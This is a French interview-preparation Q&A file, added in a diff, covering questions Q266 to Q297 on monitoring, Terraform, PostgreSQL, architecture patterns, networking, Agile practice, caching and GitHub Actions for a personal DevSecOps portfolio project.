+- **Visualisations** avancées dans Kibana
+- **Complexité** : cluster Elasticsearch à maintenir, mises à jour, sauvegardes
+
+**CloudWatch Logs** :
+- **Managé AWS** → zéro maintenance, scalable automatiquement
+- **Intégration native** EC2/Lambda/RDS/ECS → logs automatiques
+- **CloudWatch Logs Insights** : requêtes SQL-like sur les logs
+- **Coût** : pay-per-use (~$0.50/GB ingéré + $0.005/GB stocké)
+
+**Dans ce projet** : CloudWatch (managé, simplicité, intégration native). ELK serait justifié pour des volumes élevés (milliards de logs/jour) ou des besoins de recherche full-text avancés non couverts par CloudWatch Insights.
+
+---
+
+### Q266 — Qu'est-ce que le monitoring synthétique et comment le mettre en place ?
+
+Le monitoring synthétique simule des interactions utilisateur à intervalles réguliers pour vérifier la disponibilité et les performances — sans attendre qu'un vrai utilisateur signale un problème.
+
+```yaml
+# Exemple : CloudWatch Synthetics Canary
+- Toutes les 5 minutes, un script Puppeteer :
+  1. Charge https://charrad-devsecops.duckdns.org
+  2. Clique sur "Voir les projets"
+  3. Vérifie que 2+ cartes projets sont affichées
+  4. Mesure le temps de chargement (alerte si > 3s)
+  5. Prend un screenshot en cas d'échec
+```
+
+**Outils** :
+- **AWS CloudWatch Synthetics** : intégré à CloudWatch, Puppeteer/Selenium
+- **Datadog Synthetic Tests** : très complet, coûteux
+- **Uptime Robot** (gratuit) : ping HTTP simple, alertes email
+
+**Différence avec les health checks** : les health checks vérifient que le serveur répond. Le monitoring synthétique vérifie que le **parcours utilisateur** fonctionne de bout en bout.
+
+---
+
+### Q267 — Comment configurez-vous Prometheus pour scraper plusieurs targets ?
+
+```yaml
+# prometheus.yml
+global:
+  scrape_interval: 15s
+  evaluation_interval: 15s
+
+scrape_configs:
+  - job_name: 'portfolio-backend'
+    metrics_path: '/actuator/prometheus'
+    static_configs:
+      - targets: ['backend:8080']
+    relabel_configs:
+      - source_labels: [__address__]
+        target_label: instance
+
+  - job_name: 'redis'
+    static_configs:
+      - targets: ['redis-exporter:9121']
+
+  - job_name: 'node-exporter'
+    static_configs:
+      - targets: ['node-exporter:9100']
+    scrape_interval: 30s  # Override global
+
+alerting:
+  alertmanagers:
+    - static_configs:
+        - targets: ['alertmanager:9093']
+
+rule_files:
+  - '/etc/prometheus/alerts/*.yml'
+```
+
+**Dans ce projet** : Spring Boot Actuator expose directement `/actuator/prometheus` — pas besoin d'exporter séparé. Redis nécessite un `redis_exporter` (agent intermédiaire qui traduit les métriques Redis vers le format Prometheus).
+
+---
+
+### Q268 — Qu'est-ce que les pratiques on-call SRE et comment se prépare-t-on ?
+
+L'on-call est la permanence pour répondre aux alertes en dehors des heures ouvrées. Bonnes pratiques SRE :
+
+**Avant l'on-call** :
+- Runbooks à jour pour chaque alerte (Q194)
+- Dashboards Grafana lisibles par quelqu'un réveillé à 3h du matin
+- Alertes calibrées : assez sensibles pour détecter, assez spécifiques pour éviter les faux positifs
+
+**Pendant l'on-call** :
+- Utiliser les runbooks, ne pas improviser sous stress
+- Communiquer l'état toutes les 30 min (même "pas encore résolu")
+- Prioriser la mitigation (rollback rapide) avant la résolution (fix propre)
+
+**Après l'on-call** :
+- Post-mortem blameless (Q152)
+- Améliorer les runbooks avec ce qui a été appris
+- Réduire le bruit d'alerte (trop d'alertes → alerte fatigue → alertes ignorées)
+
+**Dans ce projet** : CloudWatch Alarmes → SNS → email. En équipe, on utiliserait PagerDuty ou OpsGenie pour la rotation d'astreinte et l'escalade automatique.
+
+---
+
+## Terraform Avancé
+
+### Q269 — Comment structurez-vous les modules Terraform dans un projet réel ?
+
+```
+terraform/
+├── modules/              # Modules réutilisables
+│   ├── vpc/
+│   │   ├── main.tf
+│   │   ├── variables.tf
+│   │   └── outputs.tf
+│   ├── ec2/
+│   ├── rds/
+│   ├── lambda-contact-form/
+│   ├── lambda-image-resize/
+│   └── lambda-weekly-report/
+├── environments/
+│   ├── dev/
+│   │   ├── main.tf          # Appelle les modules avec des variables dev
+│   │   ├── terraform.tfvars
+│   │   └── backend.tf       # S3 backend spécifique dev
+│   └── prod/
+│       ├── main.tf
+│       └── terraform.tfvars
+└── shared/
+    └── iam-roles.tf         # Ressources partagées entre envs
+```
+
+**Dans ce projet** : cette structure est implémentée. Chaque Lambda a son module dédié (`lambda-contact-form/`) avec `main.tf` (ressource Lambda), `variables.tf` (entrées : nom, handler, env vars), `outputs.tf` (ARN Lambda, URL API Gateway).
+
+---
+
+### Q270 — Qu'est-ce que les `data sources` Terraform et quand les utiliser ?
+
+Les `data sources` permettent de **lire** des ressources existantes sans les gérer. Contrairement aux `resource`, elles ne créent/modifient rien.
+
+```hcl
+# Lire l'AMI Amazon Linux 2023 la plus récente
+data "aws_ami" "amazon_linux_2023" {
+  most_recent = true
+  owners      = ["amazon"]
+  filter {
+    name   = "name"
+    values = ["al2023-ami-*-x86_64"]
+  }
+}
+
+# Utiliser dans une resource
+resource "aws_instance" "portfolio" {
+  ami           = data.aws_ami.amazon_linux_2023.id
+  instance_type = "t3.small"
+}
+
+# Lire un secret existant dans Secrets Manager
+data "aws_secretsmanager_secret_version" "db_password" {
+  secret_id = "portfolio/dev"
+}
+```
+
+**Cas d'usage** :
+- AMI la plus récente (toujours up-to-date sans hardcoder l'AMI ID)
+- ID d'une ressource créée hors Terraform (compte AWS courant, zones de disponibilité)
+- Secrets existants à injecter dans la configuration
+
+---
+
+### Q271 — Qu'est-ce qu'Ansible et en quoi est-il complémentaire de Terraform ?
+
+**Terraform** : provisionne l'infrastructure (crée l'EC2, le VPC, la RDS). Il gère l'état des ressources cloud.
+
+**Ansible** : configure les machines une fois provisionnées (installe Docker, copie les fichiers de configuration, exécute des commandes). Il est agentless (SSH) et idempotent.
+
+**Flux typique** :
+```
+Terraform → crée EC2 (IP = 13.39.x.x)
+Ansible → se connecte via SSH à 13.39.x.x → installe Docker + docker-compose → démarre les services
+```
+
+**Dans ce projet** : le `user_data` de l'EC2 Terraform joue le rôle d'Ansible (script bash qui installe Docker et clone le repo). Pour un vrai environment multi-machines, Ansible Playbooks seraient plus maintenables.
+
+**Terraform + Ansible** = le duo classique IaC : Terraform pour l'infra immuable, Ansible pour la configuration mutable.
+
+---
+
+### Q272 — Qu'est-ce que `terraform import` et dans quel cas l'utiliser ?
+
+`terraform import` associe une ressource AWS existante (créée manuellement ou hors Terraform) au state Terraform.
+
+```bash
+# Importer une instance EC2 existante dans Terraform
+terraform import aws_instance.portfolio i-0abcd1234ef567890
+
+# Importer un bucket S3
+terraform import aws_s3_bucket.images portfolio-dev-images
+```
+
+**Cas d'usage** :
+1. **Brownfield migration** : une équipe a créé des ressources via la console AWS, on veut maintenant les gérer avec Terraform
+2. **State perdu** : le `terraform.tfstate` a été supprimé, les ressources AWS existent toujours — import pour reconstruire le state
+3. **Split d'état** : diviser un gros state en modules
+
+**Workflow** :
+1. Écrire le bloc `resource` dans le code Terraform
+2. `terraform import` pour associer la ressource existante
+3. `terraform plan` → doit afficher "No changes" si le code correspond à la réalité
+4. Ajuster jusqu'à zéro diff
+
+---
+
+## Base de données Avancée
+
+### Q273 — Qu'est-ce que les propriétés ACID d'une transaction ?
+
+ACID garantit la fiabilité des transactions de base de données :
+
+- **Atomicité** : la transaction est tout ou rien. Si une étape échoue, toutes les modifications sont annulées. `@Transactional` en Spring Boot garantit l'atomicité.
+- **Cohérence** : la transaction amène la DB d'un état valide à un autre état valide. Les contraintes (FK, UNIQUE, NOT NULL) sont vérifiées.
+- **Isolation** : les transactions concurrentes ne se voient pas mutuellement pendant leur exécution. Niveaux : READ UNCOMMITTED, READ COMMITTED, REPEATABLE READ, SERIALIZABLE.
+- **Durabilité** : une fois commitée, la transaction persiste même en cas de panne (grâce au WAL - Write-Ahead Log de PostgreSQL).
+
+**Dans ce projet** : `@Transactional(readOnly = true)` → isolation READ COMMITTED (défaut PostgreSQL). `@Transactional` (écriture) → atomicité garantie si une exception est levée.
+
+---
+
+### Q274 — Qu'est-ce que la réplication PostgreSQL et comment fonctionne-t-elle ?
+
+La réplication PostgreSQL copie les données du **primaire** (master) vers un ou plusieurs **réplicas** (standby) :
+
+**Streaming Replication** (physique) :
+- Le primaire envoie le WAL (Write-Ahead Log) en continu
+- Le réplica rejoue le WAL → copie exacte du primaire
+- Lag typique : < 100ms
+
+**Logical Replication** :
+- Réplique des tables ou opérations spécifiques (plus flexible)
+- Permet des versions PostgreSQL différentes entre primaire et réplica
+
+**Types de standby** :
+- **Hot standby** : le réplica accepte des requêtes SELECT → soulage les lectures
+- **Warm standby** : le réplica ne sert aucun trafic (failover pur)
+
+**Dans ce projet** : RDS PostgreSQL Single-AZ (pas de réplica). Multi-AZ RDS → réplication synchrone automatique + failover automatique en ~60s. Read Replica RDS → pour décharger les requêtes SELECT intensives.
+
+---
+
+### Q275 — Qu'est-ce que le sharding et en quoi diffère-t-il du partitionnement ?
+
+**Partitionnement** : diviser une table en plusieurs partitions sur le **même serveur** PostgreSQL. Les données sont toujours dans la même instance.
+
+```sql
+-- Partitionnement par mois sur la table d'audit
+CREATE TABLE audit_logs (
+  id BIGSERIAL,
+  created_at TIMESTAMPTZ NOT NULL,
+  event TEXT
+) PARTITION BY RANGE (created_at);
+
+CREATE TABLE audit_logs_2026_01 PARTITION OF audit_logs
+  FOR VALUES FROM ('2026-01-01') TO ('2026-02-01');
+```
+
+**Sharding** : distribuer les données sur **plusieurs serveurs** différents. Chaque shard est une instance PostgreSQL indépendante.
+
+| | Partitionnement | Sharding |
+|--|----------------|---------|
+| Serveurs | 1 | N |
+| Complexité | Faible | Élevée |
+| Scalabilité | Verticale (RAM/CPU) | Horizontale (N machines) |
+| Requêtes cross-partition | Transparentes | Complexes (cross-shard JOIN) |
+
+**Dans ce projet** : ni l'un ni l'autre (table projects < 1000 lignes). Pour des millions de projets : partitionnement par status ou date.
+
+---
+
+### Q276 — Qu'est-ce que PgBouncer et pourquoi l'utiliser avec Spring Boot ?
+
+PgBouncer est un **connection pooler** externe pour PostgreSQL. Il se place entre l'application et PostgreSQL.
+
+**Problème** : PostgreSQL crée un processus OS par connexion. 200 connexions HikariCP × N instances Spring Boot = des milliers de processus PostgreSQL → épuisement mémoire.
+
+```
+Spring Boot (HikariCP, 10 connections)
+        ↓
+[PgBouncer : pool de 10 connections vers PG]
+        ↓
+PostgreSQL (max_connections = 100)
+```
+
+**Modes** :
+- **Session** : 1 connexion PostgreSQL par session client (pas d'économie)
+- **Transaction** : la connexion PostgreSQL est libérée entre les transactions → N applications peuvent partager M connexions (M << N)
+- **Statement** : libérée entre chaque requête (incompatible avec les transactions)
+
+**Dans ce projet** : HikariCP direct (10 connexions max, trafic faible). PgBouncer serait indispensable pour 50+ instances Spring Boot partageant le même RDS.
+
+---
+
+### Q277 — Qu'est-ce que la recherche full-text PostgreSQL et quand l'utiliser ?
+
+PostgreSQL inclut un moteur de recherche full-text natif, sans Elasticsearch.
+
+```sql
+-- Ajouter une colonne tsvector
+ALTER TABLE projects ADD COLUMN search_vector tsvector;
+UPDATE projects SET search_vector = to_tsvector('french', title || ' ' || description);
+CREATE INDEX idx_projects_search ON projects USING GIN(search_vector);
+
+-- Rechercher
+SELECT * FROM projects
+WHERE search_vector @@ plainto_tsquery('french', 'machine learning AWS')
+ORDER BY ts_rank(search_vector, plainto_tsquery('french', 'machine learning AWS')) DESC;
+```
+
+**Fonctionnalités** :
+- Stemming (chercher "déploiement" trouve "déployer", "déployé")
+- Stop words (les, de, et → ignorés)
+- Ranking par pertinence
+- Plusieurs langues
+
+**Dans ce projet** : la recherche de projets côté Angular filtre en mémoire (dataset petit). Si le nombre de projets dépassait 1000, le full-text PostgreSQL remplacerait avantageusement une solution externe comme Elasticsearch.
+
+---
+
+## Architecture & Patterns
+
+### Q278 — Quels principes SOLID applique-t-on dans ce projet ?
+
+SOLID est un acronyme de 5 principes de design orienté objet :
+
+**S — Single Responsibility** : chaque classe a une seule raison de changer.
+→ `ProjectService` ne fait que la logique métier. `ProjectRepository` gère la persistance. `ProjectMapper` gère le mapping.
+
+**O — Open/Closed** : ouvert à l'extension, fermé à la modification.
+→ Ajouter un nouveau type de notification : implémenter `NotificationStrategy` sans toucher `ProjectService`.
+
+**L — Liskov Substitution** : une sous-classe peut remplacer sa classe parente.
+→ `ProjectRepository` (interface Spring Data) peut être remplacée par une implémentation de test.
+
+**I — Interface Segregation** : interfaces fines plutôt qu'une grosse interface.
+→ `UserDetailsService` (lire l'utilisateur) séparé de `UserService` (modifier l'utilisateur).
+
+**D — Dependency Inversion** : dépendre des abstractions, pas des implémentations.
+→ `ProjectService` dépend de `ProjectRepository` (interface), pas de `JpaProjectRepository` (impl).
+
+---
+
+### Q279 — Qu'est-ce que l'Architecture Hexagonale (Ports & Adapters) ?
+
+L'architecture hexagonale isole le **domaine métier** au centre, entouré de **ports** (interfaces) et d'**adapters** (implémentations concrètes).
+
+```
+                    [REST Controller]
+                           ↓ (Adapter entrant)
+[Tests unitaires] → [Port entrant] → [Domain Service] → [Port sortant] → [Adapter sortant]
+                                                                    ↑               ↑
+                                                            [JPA Repository]  [Redis Cache]
+                                                            [Email Service]   [Kafka Producer]
+```
+
+**Avantage** : le domaine métier (business logic pure) n'a aucune dépendance sur Spring, JPA, ou AWS. On peut tester la logique métier sans infrastructure.
+
+**Dans ce projet** : la structure suit partiellement cette architecture — les services (`ProjectService`) sont découplés des controllers et des repositories via les interfaces Spring Data. Pour une architecture hexagonale stricte, on renommerait les interfaces en `ProjectPort` et séparerait en packages `domain`, `application`, `infrastructure`.
+
+---
+
+### Q280 — Qu'est-ce que les 12-Factor App et lesquels avez-vous appliqués ?
+
+Les 12 facteurs sont un manifeste (Heroku, 2011) pour construire des applications cloud-native scalables.
+
+| Facteur | Application dans ce projet |
+|---------|--------------------------|
+| **I — Codebase** | Un seul repo Git (monorepo frontend + backend) |
+| **II — Dependencies** | `pom.xml` et `package.json` déclarent toutes les dépendances |
+| **III — Config** | Variables d'environnement pour les secrets, URLs, profiles |
+| **IV — Backing services** | PostgreSQL, Redis, Kafka traités comme des ressources attachées |
+| **V — Build/Release/Run** | Build → image Docker (ECR), Release → tag SHA, Run → EC2 |
+| **VI — Processes** | Spring Boot stateless, état dans PostgreSQL/Redis |
+| **VII — Port binding** | Spring Boot écoute sur `PORT=8080` via variable d'env |
+| **VIII — Concurrency** | Virtual Threads pour scale horizontalement |
+| **IX — Disposability** | Arrêt gracieux (`SIGTERM` → Spring Boot shutdown hook) |
+| **X — Dev/Prod parity** | Testcontainers = même PostgreSQL en test et prod |
+| **XI — Logs** | Logs JSON structurés vers stdout → CloudWatch |
+| **XII — Admin processes** | Migrations Flyway = tâche admin séparée (init container K8s) |
+
+---
+
+### Q281 — Qu'est-ce que l'Event-Driven Architecture et comment ce projet l'utilise-t-il ?
+
+**Event-Driven Architecture (EDA)** : les composants communiquent via des événements publiés sur un bus de messages, plutôt que par des appels directs (couplage temporel et spatial réduit).
+
+**Avantages** :
+- **Découplage** : le producer d'événements ne connaît pas les consumers
+- **Extensibilité** : ajouter un consumer ne modifie pas le producer
+- **Résilience** : si un consumer est down, les événements s'accumulent dans la queue
+- **Audit trail** : l'historique des événements EST l'historique métier
+
+**Dans ce projet** (Phase 10 — Kafka) :
+```
+Admin crée un projet → ProjectService.createProject()
+  → publie ProjectCreatedEvent sur portfolio.projects.created
+     → AuditEventConsumer loggue l'événement
+     → (futur) NotificationConsumer envoie un email
+     → (futur) SearchIndexConsumer met à jour Elasticsearch
+```
+
+Le ProductService ne sait pas qui consomme ses événements → extension sans modification.
+
+---
+
+## Réseau & Protocoles
+
+### Q282 — Comment implémenteriez-vous WebSockets dans ce projet Spring Boot + Angular ?
+
+**WebSockets** permettent une connexion bidirectionnelle persistante entre client et serveur — idéal pour le temps réel (notifications, chat, live dashboard).
+
+**Backend Spring Boot** :
+```java
+@Configuration
+@EnableWebSocketMessageBroker
+public class WebSocketConfig implements WebSocketMessageBrokerConfigurer {
+    @Override
+    public void registerStompEndpoints(StompEndpointRegistry registry) {
+        registry.addEndpoint("/ws").setAllowedOriginPatterns("*").withSockJS();
+    }
+    @Override
+    public void configureMessageBroker(MessageBrokerRegistry registry) {
+        registry.enableSimpleBroker("/topic");  // server → client
+        registry.setApplicationDestinationPrefixes("/app"); // client → server
+    }
+}
+
+// Envoyer une notification depuis le service
+messagingTemplate.convertAndSend("/topic/projects", newProject);
+```
+
+**Frontend Angular** :
+```typescript
+const client = new Client({ brokerURL: 'ws://localhost:8080/ws' });
+client.onConnect = () => {
+  client.subscribe('/topic/projects', (msg) => {
+    this.projects.update(list => [...list, JSON.parse(msg.body)]);
+  });
+};
+```
+
+**Cas d'usage** : notifications en temps réel quand l'admin crée un projet (visible instantanément sans refresh).
+
+---
+
+### Q283 — Quelle est la différence entre gRPC et REST, et quand utiliser gRPC ?
+
+**REST** : HTTP/1.1 ou HTTP/2, JSON, stateless, large adoption.
+
+**gRPC** (Google Remote Procedure Call) :
+- Protocole binaire (Protocol Buffers) → 5-10x plus compact que JSON
+- HTTP/2 natif → multiplexing, streaming bidirectionnel
+- Schema strict (`.proto`) → génération de code client dans 10+ langages
+- Streaming natif (server-streaming, client-streaming, bidirectionnel)
+
+```protobuf
+// portfolio.proto
+service ProjectService {
+  rpc GetProject(GetProjectRequest) returns (Project);
+  rpc StreamProjects(StreamRequest) returns (stream Project); // streaming
+}
+```
+
+**Quand gRPC ?**
+- Communication inter-services (microservices) → performances critiques, schema strict
+- Streaming (données en temps réel, logs en continu)
+- Mobile → payload réduit, batterie économisée
+
+**Quand REST ?**
+- API publique (navigateurs, partenaires, outils tiers) → REST universellement supporté
+- Simplicité → JSON lisible, curl, Postman
+- Ce projet → REST (API consommée par un navigateur Angular)
+
+---
+
+### Q284 — Qu'est-ce que les stratégies de cache HTTP (Cache-Control, ETag, Last-Modified) ?
+
+**Cache-Control** : directive principale contrôlant le comportement du cache.
+```
+Cache-Control: public, max-age=31536000, immutable
+# Les fichiers Angular avec hash (main.abc123.js) sont immuables → 1 an de cache
+
+Cache-Control: no-cache
+# Toujours revalider avec le serveur (mais peut utiliser le cache si validé)
+
+Cache-Control: no-store
+# Jamais mettre en cache (données sensibles, réponses auth)
+```
+
+**ETag** : empreinte du contenu. Si le contenu n'a pas changé, le serveur répond 304 Not Modified.
+```
+GET /api/projects
+→ 200 OK, ETag: "abc123", Cache-Control: max-age=60
+
+GET /api/projects (60s après)
+→ If-None-Match: "abc123"
+  ← 304 Not Modified (pas de body → économie de bande passante)
+```
+
+**Dans ce projet** :
+- Assets Angular statiques → `max-age=31536000, immutable` (hash dans le nom)
+- `index.html` → `no-cache` (référence les assets, doit être toujours frais)
+- API REST → `Cache-Control: no-store` (données dynamiques)
+
+---
+
+### Q285 — Quels sont les algorithmes de load balancing et leurs cas d'usage ?
+
+| Algorithme | Fonctionnement | Cas d'usage |
+|-----------|---------------|-------------|
+| **Round Robin** | Tour à tour : req1→s1, req2→s2, req3→s3... | Instances homogènes, requêtes uniformes |
+| **Least Connections** | Vers l'instance avec le moins de connexions actives | Requêtes de durée variable |
+| **IP Hash** | L'IP client détermine toujours la même instance | Sessions sticky (sans cache partagé) |
+| **Weighted Round Robin** | Round Robin pondéré par capacité | Instances hétérogènes (s1=2x s2) |
+| **Random** | Instance aléatoire | Cas simples, performances similaires à Round Robin |
+| **Least Response Time** | Vers l'instance la plus rapide | Latence critique |
+
+**AWS ALB** : utilise Least Outstanding Requests par défaut pour l'HTTP (meilleur que Round Robin).
+
+**NGINX** dans ce projet : round-robin (upstream backend) entre les containers si on scalerait horizontalement. Actuellement : single backend, pas de LB applicatif.
+
+---
+
+## Soft Skills & Méthodo
+
+### Q286 — Comment fonctionnez-vous en méthodologie Agile/Scrum ?
+
+Scrum est un framework Agile avec des itérations courtes (Sprints de 2 semaines) et des cérémonies structurées.
+
+**Cérémonies que j'applique** :
+- **Sprint Planning** : sélectionner les User Stories du backlog, les estimer (story points ou t-shirt sizing), définir le Sprint Goal
+- **Daily Standup** : 15 min max. "Ce que j'ai fait, ce que je vais faire, mes blocages." Pas de réunion de statut.
+- **Sprint Review** : démonstration du travail réalisé aux stakeholders. Feedback direct.
+- **Sprint Retrospective** : "Ce qui a bien marché / ce qu'on améliore / action concrète pour le prochain sprint"
+
+**Dans ce projet** : travail en solo → pas de Scrum formel. Mais les commits Conventional Commits et le découpage en Phases (1-22) reflètent un découpage sprint-like : chaque phase a une définition claire de "Done".
+
+**En équipe** : j'utilise le Kanban Board GitHub Projects pour visualiser le Work In Progress et limiter le WIP à 2 items par personne.
+
+---
+
+### Q287 — Comment faites-vous une bonne code review ?
+
+Une code review efficace équilibre correction technique et préservation de la motivation.
+
+**Ce que je vérifie** :
+1. **Exactitude** : la logique est-elle correcte ? Les edge cases sont-ils gérés ?
+2. **Sécurité** : inputs validés ? Secrets exposés ? Nouvelles CVEs ?
+3. **Tests** : le comportement nouveau est-il couvert ? Les tests rouges existent ?
+4. **Lisibilité** : je comprends le code en 30 secondes ? Les noms sont explicites ?
+5. **Architecture** : respecte les patterns existants ? Pas de couplage introduit ?
+
+**Ce que j'évite** :
+- Commenter le style (c'est le rôle de Prettier/Checkstyle automatiques)
+- Les "nitpicks" bloquants sur des questions de goût
+- Bloquer une PR pour de la perfection quand le code est "assez bon"
+
+**Format des commentaires** :
+- `[Suggestion]` : idée, pas bloquant
+- `[Question]` : je comprends pas, clarifie svp
+- `[Bloquant]` : doit être corrigé avant merge (bug, sécurité)
+
+---
+
+### Q288 — Comment estimez-vous une tâche technique ?
+
+Trois approches selon le contexte :
+
+**Story Points (Fibonacci)** : estimation relative à une story de référence. "Si créer un CRUD simple = 3 points, ajouter Kafka = ?" Élimine le débat sur les heures réelles.
+
+**T-shirt sizing** (XS/S/M/L/XL) : pour les estimations rapides en planning. M = une journée, L = une semaine, XL = à décomposer.
+
+**Three-Point Estimation** : `(Optimiste + 4×Probable + Pessimiste) / 6`. Tient compte de l'incertitude.
+
+**Règles personnelles** :
+- Toujours décomposer jusqu'à des tâches de max 2 jours — si plus long, l'estimation est incertaine
+- Inclure : tests, documentation, code review, déploiement (pas juste le code)
+- Spike technique si incertitude haute : 1 jour d'exploration avant d'estimer
+- Ne jamais estimer sous pression ou commiter une date sans avoir vu le code
+
+---
+
+### Q289 — Comment restez-vous organisé face à la complexité d'un projet comme celui-ci ?
+
+**Documentation progressive** : chaque phase a son `docs/PHASEn-*.md` écrit *pendant* le développement, pas après. Quand je me retrouve à expliquer la même chose deux fois → je l'écris.
+
+**Git comme carnet de bord** : les messages de commit Conventional Commits racontent l'histoire du projet. `git log --oneline` donne une vue chronologique lisible.
+
+**Checklist de définition de "Done"** :
+```
+Pour chaque feature :
+[ ] Code écrit et testé (unitaire + intégration)
+[ ] CI verte
+[ ] Déployé en dev
+[ ] Documentation à jour
+[ ] Pas de TODO ni de secret en clair
+```
+
+**Timeboxing** : chaque phase est bornée dans le temps (max 3-4 jours). Si ça prend plus → je documente l'état partiel et je continue — mieux vaut une phase à 80% et une prochaine phase que de bloquer indéfiniment.
+
+---
+
+### Q290 — Que faites-vous quand vous êtes bloqué sur un problème technique ?
+
+**Processus en 5 étapes** :
+
+1. **Isoler** (15 min) : reproduire le problème minimal (MCVE — Minimal Complete Verifiable Example). Supprimer tout ce qui ne reproduit pas le bug.
+
+2. **Chercher** (30 min) : message d'erreur exact dans Google, Stack Overflow, GitHub Issues, documentation officielle. La plupart des problèmes ont déjà une solution publiée.
+
+3. **Rubber ducking** : expliquer le problème à voix haute (à quelqu'un ou à soi-même). L'explication force à structurer la pensée.
+
+4. **Changer d'approche** : si bloqué > 2h sur la même piste, remettre en question l'approche — peut-être que le problème est ailleurs.
+
+5. **Demander** : formuler une question précise (contexte + ce que j'ai essayé + ce que j'attends). Une bonne question obtient une bonne réponse.
+
+**Dans ce projet** : le problème K3s vs Docker Compose (Q15) a été résolu en changeant d'approche après 4h de debugging mémoire → pragmatisme > obstination.
+
+---
+
+## Performance & Cache
+
+### Q291 — Quelles sont les stratégies de cache (cache-aside, write-through, write-behind) ?
+
+**Cache-Aside** (Lazy Loading) — utilisé dans ce projet :
+```
+Lire → vérifier cache → HIT : retourner → MISS : lire DB, stocker en cache, retourner
+Écrire → écrire DB + invalider cache (@CacheEvict)
+```
+Avantage : le cache ne contient que ce qui est lu. Inconvénient : first request toujours lente (cold start).
+
+**Write-Through** :
+```
+Écrire → écrire cache ET DB simultanément → toujours cohérent
+Lire → toujours dans le cache (si lu récemment)
+```
+Inconvénient : les données rarement lues occupent le cache.
+
+**Write-Behind** (Write-Back) :
+```
+Écrire → écrire cache seulement → flush DB asynchrone
+```
+Avantage : très rapide en écriture. Risque de perte de données si le cache crashe avant le flush.
+
+**Dans ce projet** : Cache-Aside via `@Cacheable` + `@CacheEvict`. Redis TTL de 5-10 min évite les données périmées sans nécessité de `@CacheEvict` explicite pour toutes les mutations.
+
+---
+
+### Q292 — Comment optimisez-vous le bundle Angular en production ?
+
+**Configuration de base** (automatique avec `ng build --configuration=production`) :
+- Tree-shaking : supprime le code non utilisé
+- Minification + uglification (Terser)
+- AOT compilation (plus de compilation JIT au runtime)
+- Differential loading (ES2015+ pour les navigateurs modernes)
+
+**Techniques supplémentaires appliquées** :
+
+1. **Lazy loading** des routes (Q32) → bundle initial < 150KB
+2. **`trackBy` dans les `@for`** → moins de re-rendus DOM
+3. **`OnPush` Change Detection** → moins de cycles de détection
+4. **`@defer (on viewport)`** (Q204) → composants lourds chargés à la demande
+5. **Images WebP** via Lambda resize (Q52) → 30-50% plus légères
+6. **Compression Gzip/Brotli** dans NGINX → réduction 70% de la taille de transfert
+
+**Audit** :
+```bash
+ng build --stats-json
+npx webpack-bundle-analyzer dist/stats.json
+# Visualise quel module prend quelle taille → identifier les imports lourds
+```
+
+---
+
+### Q293 — Qu'est-ce que le pattern Async Processing avec des queues et quand l'utiliser ?
+
+**Problème** : une action utilisateur déclenche un traitement long (resize d'image, envoi d'email, génération de rapport). Faire attendre l'utilisateur = mauvaise UX.
+
+**Solution** : découpler la requête HTTP de son traitement via une queue.
+
+```
+1. POST /upload → Spring Boot valide, sauvegarde le fichier → répond 202 Accepted
+2. Spring Boot publie un message dans SQS/Kafka : "Image {id} à traiter"
+3. Le user reçoit une réponse immédiate avec un job_id
+4. Un worker Lambda/Spring Batch consomme la queue → traite l'image
+5. Le worker notifie (WebSocket/SSE) quand le traitement est terminé
+```
+
+**Avantages** :
+- Réponse immédiate (202) même si le traitement prend 30 secondes
+- Retry automatique si le worker échoue
+- Scalabilité : N workers pour N messages en parallèle
+- Pic de charge absorbé par la queue (SQS = buffer illimité)
+
+**Dans ce projet** : le Lambda image-resize est déclenché par S3 Event (pas de queue) — fonctionnel pour un faible volume. Pour des milliers d'images simultanées : S3 → SQS → Lambda (avec concurrence contrôlée).
+
+---
+
+## Situations finales
+
+### Q294 — Vous rejoignez une équipe dont le pipeline CI/CD est cassé depuis 2 semaines. Que faites-vous ?
+
+*(Question situationnelle — approche méthodique)*
+
+**Jour 1 — Comprendre avant d'agir** :
+1. Lire les logs des derniers runs échoués (ne pas supposer la cause)
+2. Identifier le dernier commit "vert" — qu'est-ce qui a changé depuis ?
+3. Parler à l'équipe : savent-ils pourquoi ? Ont-ils essayé quelque chose ?
+
+**Jours 2-3 — Isoler la cause** :
+- Classer : infrastructure (runner down), dépendance externe (rate limit), code (test cassé), config (secret expiré)
+- Tester localement les étapes qui échouent
+
+**Résoudre et restaurer la confiance** :
+- Fix minimal pour débloquer → merge rapide
+- Documenter la cause racine et la solution
+- Proposer une alerte proactive (notification Slack si le pipeline est rouge > 1h)
+
+**Ne pas faire** : réécrire tout le pipeline pour "le faire mieux" avant d'avoir déblooqué la situation. Prioriser le rétablissement, puis l'amélioration.
+
+---
+
+### Q295 — Comment aborderiez-vous une migration d'une application monolithique vers des microservices ?
+
+**Approche "Strangler Fig Pattern"** (Martin Fowler) — ne jamais réécrire from scratch.
+
+**Phase 1 — Analyser** :
+- Cartographier les domaines métier (Domain-Driven Design) → identifier les bounded contexts
+- Identifier les couplages forts → les garder ensemble
+- Mesurer : quels modules ont le plus de changements ? Le plus de bugs ? Le plus de charge ?
+
+**Phase 2 — Extraire progressivement** :
+- Commencer par le module le moins couplé (ex: envoi d'email → Lambda)
+- Ajouter une API Gateway devant le monolithe
+- Extraire un service, le tester, puis le suivant
+
+**Phase 3 — Synchroniser les données** :
+- Éviter le "distributed monolith" (microservices qui partagent la même DB)
+- Chaque service a sa propre DB
+- Événements Kafka pour la cohérence éventuelle entre services
+
+**Erreurs à éviter** :
+- Tout extraire en même temps (trop de risque)
+- Sous-estimer la complexité opérationnelle (N services = N pipelines CI/CD, N configs, N dashboards)
+- Extraire sans critère de découpe → "nanoservices" inutilement complexes
+
+---
+
+### Q296 — Comment présenteriez-vous la valeur de ce projet DevSecOps à un DSI ?
+
+*(Question de clôture — synthèse)*
+
+---
+
+## CI/CD & Artefacts
+
+### Q297 — Comment fonctionnent les Artifacts et le cache dans GitHub Actions ?
+
+**Artifacts** : fichiers persistés après la fin d'un job, téléchargeables depuis l'onglet Actions.
+```yaml
+- name: Upload JAR
+  uses: actions/upload-artifact@v4
+  with:
+    name: backend-jar
+    path: backend/target/*.jar
+    retention-days: 7
+
+- name: Download JAR (dans un autre job)
+  uses: actions/download-artifact@v4
+  with:
+    name: backend-jar
+```
+
+**Cache** : accélère les builds en réutilisant les dépendances entre runs.
+```yaml
+- uses: actions/cache@v4
+  with:
+    path: ~/.m2/repository
+    key: ${{ runner.os }}-maven-${{ hashFiles('**/pom.xml') }}
+    restore-keys: ${{ runner.os }}-maven-
+```
+
+**Différence** : le cache est restauré entre les runs (même branche ou branche parente). Les artifacts sont des livrables à partager entre jobs ou à télécharger manuellement.
+
